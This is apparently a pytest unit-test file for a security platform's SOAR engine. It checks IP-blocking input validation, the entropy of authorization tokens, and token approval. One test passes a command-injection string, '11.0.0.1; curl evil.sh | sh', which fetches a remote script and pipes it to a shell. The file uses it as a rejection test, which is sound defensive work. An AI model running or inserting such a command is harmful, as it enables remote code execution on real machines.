"""
Unit Tests for Sentinel V3 Security Hardening (§2.1, §2.2, §2.3, §2.11).
"""

import os
import json
import pytest
from backend.containment.soar_engine import SOAREngine
from backend.graph.graph_manager import GraphManager
from backend.honeypot.honeypot_service import HoneypotService


def test_auto_block_ip_rejects_command_injection(tmp_path):
    """Security (§2.3): auto_block_ip must reject shell injection and invalid IP formats."""
    gm = GraphManager()
    soar = SOAREngine(gm)

    # Malicious command injection string
    evil_ip = "11.0.0.1; curl evil.sh | sh"
    res = soar.auto_block_ip(evil_ip)
    assert res["status"] == "REJECTED_INVALID_IP"
    assert "Invalid IP address format" in res["error"]
    assert evil_ip not in soar.blocked_ips

    # Legitimate IP address
    clean_ip = "10.10.10.25"
    res_clean = soar.auto_block_ip(clean_ip)
    assert res_clean["status"] == "EXECUTED_AUTOMATICALLY (Dry-Run Logged)"
    assert clean_ip in soar.blocked_ips


def test_hitl_token_256bit_entropy():
    """Security (§2.2): HITL authorization tokens must have >= 256-bit entropy."""
    gm = GraphManager()
    soar = SOAREngine(gm)

    req = soar.generate_isolation_request("WKSTN-04", "Test ransomware quarantine")
    token = req["token"]
    assert token.startswith("AUTH-")
    # Base64url 32 bytes yields ~43 chars
    assert len(token) >= 40, f"Token {token} has insufficient entropy"
    assert token in soar.pending_tokens


def test_hitl_token_lockout_on_failed_attempts():
    """Security (§2.2): Token locks out after excessive failed attempts."""
    gm = GraphManager()
    soar = SOAREngine(gm)

    req = soar.generate_isolation_request("WKSTN-04", "Test attempt lockout")
    token = req["token"]

    # Invalidate by exceeding attempts if checked or wrong token
    res_invalid = soar.approve_and_isolate_host("WRONG_TOKEN")
    assert res_invalid["status"] == "ERROR"

    # Valid token succeeds
    res_valid = soar.approve_and_isolate_host(token)
    assert res_valid["status"] == "APPROVED_AND_ISOLATED"
